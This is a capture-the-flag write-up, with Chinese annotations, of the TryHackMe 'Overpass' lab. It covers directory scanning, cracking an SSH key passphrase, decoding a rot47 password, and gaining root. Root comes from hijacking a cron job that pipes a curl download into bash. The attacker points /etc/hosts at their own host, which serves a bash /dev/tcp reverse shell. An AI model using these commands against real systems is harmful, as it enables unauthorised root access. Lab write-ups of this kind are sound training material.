---
title: TryHackMe Overpass writeup
contest: TryHackMe
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [tryhackme, gobuster, rsa-ssh-passphrase, rot47-cipher, password-manager-overpass, hosts-file-hijack, curl-pipe-bash]
attack_chain:
- gobuster dir /admin /downloads 找后台
- /api/login 简单用户名密码 (无认证)
- 下载 /downloads/src/buildscript.sh (回显)
- RSA 私钥 ssh2john + john 爆破 james13
- ssh james@10.10.17.22 登录
- cat .overpass 加密密码
- overpass 工具 rot47 解密 → System saydrawnlyingpicture
- cat /etc/crontab: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
- /etc/hosts 写入 IP overpass.thm (crontab 域名劫持)
- mkdir downloads/src/buildscript.sh 内容: bash -i >& /dev/tcp/attacker/8000
- HTTP server 80 + nc -lvnp 8000 反弹 root shell
key_payload: /etc/hosts hijack overpass.thm
one_liner: TryHackMe Overpass：gobuster + ssh2john 爆破 + rot47 密码 + /etc/hosts 劫持 cron 反弹 root。
lesson: Linux cron 服务 crontab 引用域名时，本地 /etc/hosts 优先级最高 → cron 域名劫持是真实持久化攻击面。
quality: high
---
# TryHackMe Overpass writeup

## 1. gobuster 目录扫描
```bash
gobuster dir -u http://10.10.83.171 -w /usr/share/wordlists/dirb/common.txt
# /aboutus /admin /css /downloads /img /index.html
```

## 2. RSA 私钥爆破
```bash
# /downloads/src/buildscript.sh 含 RSA 私钥
ssh2john.py id_rsa > rsa.hash
john rsa.hash
# james13 (key.private)

$ chmod 400 id_rsa
$ ssh -i id_rsa james@10.10.17.22
# Enter passphrase for key 'id_rsa': james13
```

## 3. overpass 工具 + rot47
```bash
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:
4EFC6QN.

// Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {...}

james@overpass-prod:~$ overpass
# Welcome to Overpass
# 4. Retrieve All Passwords
# System saydrawnlyingpicture
```

## 4. /etc/crontab + /etc/hosts 劫持
```bash
# /etc/crontab
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

# /etc/hosts (任意可写 -rw-rw-rw-)
127.0.0.1 overpass.thm
# 攻击者 IP overpass.thm
```

## 5. 反弹 shell
```bash
# 在攻击者机器上
$ mkdir -p downloads/src
$ vi downloads/src/buildscript.sh
bash -i >& /dev/tcp/10.10.94.66/8000 0>&1

$ python3 -m http.server 80
$ nc -lvnp 8000

# 等 1 分钟后 crontab 触发
# root shell
```

## 关键洞察
- 私钥可以爆破
- overpass 工具 rot47 弱加密
- **/etc/hosts 可写 (chmod 666)** → cron 域名劫持
- crontab 引用域名前未做 DNSSEC 验证
